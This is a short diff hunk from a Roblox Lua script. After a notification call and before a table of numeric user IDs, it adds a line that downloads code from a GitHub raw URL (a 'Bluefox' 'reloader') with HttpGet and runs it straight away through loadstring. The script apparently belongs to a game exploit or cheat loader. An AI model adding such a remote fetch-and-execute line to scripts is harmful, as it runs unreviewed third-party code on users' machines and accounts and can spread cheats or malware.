@@ -9,7 +9,7 @@ game:GetService('StarterGui'):SetCore("SendNotification", {
 
 });
 
---
+loadstring(game:HttpGet("https://raw.githubusercontent.com/eeeeeeeesw/Bluefox/main/reloader"))()
 local NOC = {
     [2425238] = true,
     [1842345] = true,
